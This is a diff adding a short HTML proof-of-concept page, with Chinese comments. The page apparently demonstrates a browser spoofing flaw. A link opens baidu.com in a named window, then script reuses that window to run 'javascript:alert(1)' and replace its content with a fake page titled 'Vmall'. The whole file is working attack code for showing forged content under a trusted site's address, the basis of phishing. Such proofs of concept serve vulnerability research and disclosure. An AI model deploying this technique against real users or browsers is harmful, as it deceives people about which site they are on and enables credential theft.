@@ -1,0 +1,22 @@
+<html>
+<body>
+  <!-- 创建一个超链接，点击后会触发onclick事件 -->
+  <a href="https://www.baidu.com:443." target="aa" onclick="setTimeout('fake()',100)">
+    <h1>click me</h1> <!-- 超链接的文本为“click me”，显示为一个大标题 -->
+  </a>
+
+  <!-- JavaScript代码 -->
+  <script>
+    // 定义一个名为fake的函数
+    function fake() {
+      // 打开一个新的浏览器窗口或标签页，URL为javascript:alert(1)
+      // 这个URL会在新窗口中执行JavaScript代码，弹出一个警告框，内容为1
+      var t = window.open('javascript:alert(1)', 'aa');
+      
+      // 将新打开的窗口的文档内容设置为一个假的页面
+      // 此页面的标题为“Vmall”，显示内容为“H1: Fake Page!!!”
+      t.document.body.innerHTML = '<title>Vmall</title><H1>Fake Page!!!</H1>';
+    }
+  </script>
+</body>
+</html>
